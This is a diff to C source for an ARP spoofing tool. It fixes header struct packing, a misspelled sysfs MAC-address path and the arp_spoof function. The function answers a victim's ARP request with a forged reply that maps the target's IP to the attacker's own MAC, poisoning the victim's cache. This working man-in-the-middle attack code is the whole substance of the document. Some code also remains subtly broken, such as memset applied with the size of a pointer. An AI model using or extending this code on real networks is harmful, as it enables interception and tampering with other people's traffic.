@@ -9,6 +9,7 @@
 #include <sys/socket.h>
 #include <arpa/inet.h>
 
+#pragma pack(push, 1)
 struct Ethnet_header{
 	uint8_t dstMac[6];
 	uint8_t srcMac[6];
@@ -53,7 +54,7 @@ struct Tcp_header{
 	uint16_t urgp;
 	uint8_t opt[40];
 };
-
+#pragma pack(pop)
 
 static unsigned char ascii2byte(char *val);
 
@@ -86,12 +87,12 @@ static unsigned char ascii2byte(char *val)
 
 
 int getmyMAC(char* buf, char* dev){
-	char* macstring;
+	char macstring[20];
 	char filename[256];
 	char MAC[6];
 	FILE* pf;
 	int i;
-	sprintf(filename,"/sys/class/net/%s/adderss",dev);
+	sprintf(filename,"/sys/class/net/%s/address",dev);
 	if ( !( pf = fopen(filename,"r") ) ){
 		return -1;
 	}
@@ -100,10 +101,8 @@ int getmyMAC(char* buf, char* dev){
 	}
 	fread(macstring,1,17,pf);
 	fclose(pf);
-		
-	for(i=0;i<6;i++){
+	for(i=0;i<6;i++)
 		buf[i] = ascii2byte(macstring+i*3);
-	}
 	return 1;
 }
 
@@ -111,37 +110,37 @@ int arp_spoof(char* out_packet, char* in_packet, int sender, int target, char* m
 {
 	struct Ethnet_header* eth_hp;
 	struct Arp_header* arp_hp;
-	int _nsender = htonl(sender);
-	int _ntarget = htonl(target);
 
 	eth_hp = (struct Ethnet_header*) in_packet;
+	
 	if( ntohs((*eth_hp).type) != ETHERTYPE_ARP ){
 		return -1;
 	}
+
 	arp_hp = (struct Arp_header*)( in_packet+sizeof(struct Ethnet_header) );
+
 	if(!check_arp_type(arp_hp,1,0x0800,6,4)){
 		return -2;
 	}
-	if( (*arp_hp).op!=1 ){
+	if( ntohs((*arp_hp).op)!=1 ){
 		return -3;
 	}
-
-	if( (*arp_hp).senderIP != _nsender ){
+	if( (*arp_hp).senderIP != sender ){
 		return -4;
 	}
-	if( (*arp_hp).targetIP != _ntarget ){
+	if( (*arp_hp).targetIP != target ){
 		return -5;
 	}
 
 	memset(out_packet,0,sizeof(out_packet));
 	memcpy(out_packet,(*eth_hp).srcMac,6); //dstMAC
-	memcpy(out_packet+6,(*eth_hp).dstMac,6); //srcMAC = myMAC
+	memcpy(out_packet+6,myMAC,6); //srcMAC = myMAC
 	uint16_t ethtype_arp = htons(ETHERTYPE_ARP);
 	memcpy(out_packet+12,&ethtype_arp,2);
 	memcpy(out_packet+14,&((*arp_hp).htype),6); //copy original htype,ptype,hlen,plen
 	uint16_t ARPreply=htons(2);
 	memcpy(out_packet+20,&ARPreply,2); //op ARP reply
-	memcpy(out_packet+22,(*eth_hp).dstMac,6); //senderMAC = myMAC
+	memcpy(out_packet+22,myMAC,6); //senderMAC = myMAC
 	memcpy(out_packet+28,&((*arp_hp).targetIP),4); //senderIP = org.targetIP
 	memcpy(out_packet+32,(*arp_hp).senderMAC,6); //targetMAC = org.senderMAC
 	memcpy(out_packet+38,&((*arp_hp).senderIP),4); //targetIP = org.senderIP
